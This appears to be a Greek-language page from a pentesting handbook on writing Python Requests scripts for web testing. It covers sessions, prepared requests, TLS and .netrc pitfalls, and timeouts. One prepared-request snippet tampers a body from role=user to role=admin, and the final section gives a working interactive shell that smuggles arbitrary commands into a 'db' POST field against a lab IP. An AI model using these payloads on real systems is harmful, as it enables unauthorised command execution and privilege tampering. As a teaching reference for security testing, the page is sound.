# Web Requests

{{#include ../../banners/hacktricks-training.md}}

## Python Requests

Αυτά τα παραδείγματα χρησιμοποιούν τα τεκμηριωμένα ορίσματα αιτημάτων, τις ιδιότητες αποκρίσεων, τις πλειάδες αρχείων multipart και τις sessions του Requests.<sup>[[1]](#references)</sup> Τα παραδείγματα με `verify=False` απενεργοποιούν την επαλήθευση πιστοποιητικών TLS και θα πρέπει να περιορίζονται σε ελεγχόμενες δοκιμές.<sup>[[1]](#references)</sup>
```python
import random
import re
import string

import requests

url = "http://example.com:80/some/path.php"
params = {"p1":"value1", "p2":"value2"}
headers = {"User-Agent": "fake User Agent", "Fake header": "True value"}
cookies = {"PHPSESSID": "1234567890abcdef", "FakeCookie123": "456"}
proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

#Regular Get requests sending parameters (params)
gr = requests.get(url, params=params, headers=headers, cookies=cookies, verify=False, allow_redirects=True)

code = gr.status_code
ret_headers = gr.headers
body_byte = gr.content
body_text = gr.text
ret_cookies = gr.cookies
is_redirect = gr.is_redirect
is_permanent_redirect = gr.is_permanent_redirect
float_seconds = gr.elapsed.total_seconds()

#Regular Post requests sending parameters (data)
pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=True, proxies=proxies)

#Json Post requests sending parameters(json)
pr = requests.post(url, json=params, headers=headers, cookies=cookies, verify=False, allow_redirects=True, proxies=proxies)

#Post request sending a file(files) and extra values
filedict = {"<FILE_PARAMETER_NAME>" : ("filename.png", open("filename.png", 'rb').read(), "image/png")}
pr = requests.post(url, data={"submit": "submit"}, files=filedict)

#Useful for presenting results in boolean/time based injections
print(f"\rflag: {flag}{char}", end="")




##### Example Functions
target = "http://10.10.10.10:8000"
proxies = {}
s = requests.Session()

def register(username, password):
resp = s.post(target + "/register", data={"username":username, "password":password, "submit": "Register"}, proxies=proxies, verify=0)
return resp

def login(username, password):
resp = s.post(target + "/login", data={"username":username, "password":password, "submit": "Login"}, proxies=proxies, verify=0)
return resp

def get_info(name):
resp = s.post(target + "/projects", data={"name":name, }, proxies=proxies, verify=0)
guid = re.match('<a href="\/info\/([^"]*)">' + name + '</a>', resp.text)[1]
return guid

def upload(guid, filename, data):
resp = s.post(target + "/upload/" + guid, data={"submit": "upload"}, files={"file":(filename, data)}, proxies=proxies, verify=0)
guid = re.match('"' + filename + '": "([^"]*)"', resp.text)[1]
return guid

def json_search(guid, search_string):
resp = s.post(target + "/api/search/" + guid + "/", json={"search":search_string}, headers={"Content-Type": "application/json"}, proxies=proxies, verify=0)
return resp.json()

def get_random_string(guid, path):
return ''.join(random.choice(string.ascii_letters) for i in range(10))
```
## Προετοιμασμένα requests για έλεγχο payload

Ένα `PreparedRequest` εκθέτει το τελικό URL, τα headers και το encoded body πριν σταλεί. Δημιουργήστε το με `Session.prepare_request()` (αντί για `Request.prepare()`) όταν πρέπει να εφαρμοστούν τα session cookies ή το authentication· όταν η prepared ροή πρέπει επίσης να τηρεί τις ρυθμίσεις proxy/CA του environment, συγχωνεύστε τις ρητά με `merge_environment_settings()`.<sup>[[1]](#references)</sup>
```python
s = requests.Session()
req = requests.Request("POST", url, data=b"role=user")
prepped = s.prepare_request(req)
prepped.body = b"role=admin%26debug%3D1"
prepped.headers["Content-Length"] = str(len(prepped.body))

env = s.merge_environment_settings(prepped.url, {}, None, None, None)
r = s.send(prepped, timeout=(3.05, 15), allow_redirects=False, **env)
print(r.request.headers)
print(r.request.body)
```
Αυτό είναι χρήσιμο όταν ένα exploit χρειάζεται μη τυπική κωδικοποίηση ή όταν συγκρίνετε το payload που κατασκευάστηκε με το request που αποθηκεύτηκε στο `response.request`. Δεν αποτελεί primitive για raw HTTP: το Requests αποθηκεύει τα headers σε mapping χωρίς διάκριση πεζών-κεφαλαίων, επομένως η ανάθεση ενός διπλότυπου ονόματος αντικαθιστά την προηγούμενη τιμή. Χρησιμοποιήστε sender χαμηλότερου επιπέδου για malformed request lines ή διακριτά διπλότυπα πεδία `Content-Length`/`Transfer-Encoding` που απαιτούνται για [HTTP request-smuggling tests](../../pentesting-web/http-request-smuggling/README.md).<sup>[[1]](#references)</sup>

## Απομόνωση session, implicit credentials και κατάσταση TLS

Ένα session εμπιστεύεται τις ρυθμίσεις του περιβάλλοντος από προεπιλογή. Αν δεν παρέχεται explicit authentication, το Requests μπορεί να αποκτήσει Basic credentials από το `.netrc`· μπορεί επίσης να εισαγάγει ρυθμίσεις proxy και paths για CA bundles από environment variables. Για scripts που πραγματοποιούν fetch σε URLs ελεγχόμενα από attacker, απενεργοποιήστε αυτά τα implicit inputs και ρυθμίστε explicit μόνο το intended lab proxy/CA. Οι εκδόσεις πριν από την 2.32.4 μπορούσαν να επιλέξουν credentials από το `.netrc` για λάθος host όταν τους δινόταν ένα maliciously crafted URL, ενώ το `Session.trust_env = False` είναι το τεκμηριωμένο workaround όταν η αναβάθμιση είναι αδύνατη.<sup>[[1]](#references)[[4]](#references)</sup>
```python
s = requests.Session()
s.trust_env = False
s.verify = "/path/to/lab-ca.pem"  # Prefer a lab CA over verify=False
s.proxies = {
"http": "http://127.0.0.1:8080",
"https": "http://127.0.0.1:8080",
}
```
Διατηρήστε ξεχωριστό ένα session που χρησιμοποιεί `verify=False` από τα sessions που απαιτούν επαληθευμένο TLS. Στα Requests πριν από την έκδοση 2.32.0, μια σύνδεση που άνοιξε αρχικά με `verify=False` μπορούσε να επαναχρησιμοποιηθεί για μεταγενέστερα requests του ίδιου origin, ακόμη και όταν αυτά τα requests καθόριζαν `verify=True`; η αναβάθμιση διορθώνει αυτό το ζήτημα κατάστασης του pool, όμως η απομόνωση διευκολύνει επίσης τον έλεγχο των exploit scripts.<sup>[[5]](#references)</sup>

## Αξιόπιστοι βρόχοι exploit

Το Requests δεν έχει προεπιλεγμένο timeout. Ένα timeout `(connect, read)` δεν αποτελεί συνολικό deadline ρολογιού: το στοιχείο read περιορίζει για πόσο χρόνο περιμένει ο client μεταξύ των ληφθέντων bytes. Απενεργοποιήστε τα automatic redirects όταν ο στόχος ελέγχει το `Location` και, στη συνέχεια, επικυρώστε κάθε hop πριν στείλετε νέο request· αν τα redirects είναι ενεργοποιημένα, ελέγξτε το `response.history`. Για μεγάλες ή hostile responses, χρησιμοποιήστε `stream=True`, κάντε iteration σε chunks περιορισμένου μεγέθους και κλείστε το response με έναν context manager, ώστε να απελευθερωθεί η pooled connection.<sup>[[1]](#references)</sup>
```python
limit = 2 * 1024 * 1024
body = bytearray()

with s.get(url, timeout=(3.05, 10), allow_redirects=False, stream=True) as r:
print(r.status_code, r.headers.get("Location"))
for chunk in r.iter_content(64 * 1024):
if len(body) + len(chunk) > limit:
raise ValueError("response exceeds limit")
body.extend(chunk)
```
## Python cmd για exploit ενός RCE

Ο βρόχος εντολών κληρονομεί από το Python `Cmd`· η μέθοδός του `default` διαχειρίζεται μη αναγνωρισμένα prefixes εντολών, το `cmdloop` δρομολογεί τις γραμμές εισόδου και το `re.DOTALL` επιτρέπει στο pattern εξαγωγής να εκτείνεται σε πολλές γραμμές.<sup>[[2]](#references)[[3]](#references)</sup>
```python
import requests
import re
from cmd import Cmd

class Terminal(Cmd):
prompt = "Inject => "

def default(self, args):
output = RunCmd(args)
print(output)

def RunCmd(cmd):
data = { 'db': f'lol; echo -n "MYREGEXP"; {cmd}; echo -n "MYREGEXP2"' }
r = requests.post('http://10.10.10.127/select', data=data)
page = r.text
m = re.search('MYREGEXP(.*?)MYREGEXP2', page, re.DOTALL)
if m:
return m.group(1)
else:
return 1


term = Terminal()
term.cmdloop()
```
## References

- [1] [Διεπαφή προγραμματιστών του Requests](https://requests.readthedocs.io/en/stable/api/)
- [2] [Python `cmd` — Υποστήριξη για command interpreters προσανατολισμένους σε γραμμές](https://docs.python.org/3/library/cmd.html)
- [3] [Python `re` — Λειτουργίες regular expressions](https://docs.python.org/3/library/re.html)
- [4] [Το Requests είναι ευάλωτο σε leak διαπιστευτηρίων `.netrc` μέσω κακόβουλων URLs](https://github.com/psf/requests/security/advisories/GHSA-9hjg-9r4m-mvj7)
- [5] [Το αντικείμενο `Session` του Requests δεν επαληθεύει τα requests μετά την πραγματοποίηση του πρώτου request με `verify=False`](https://github.com/psf/requests/security/advisories/GHSA-9wx4-h78v-vm56)
{{#include ../../banners/hacktricks-training.md}}
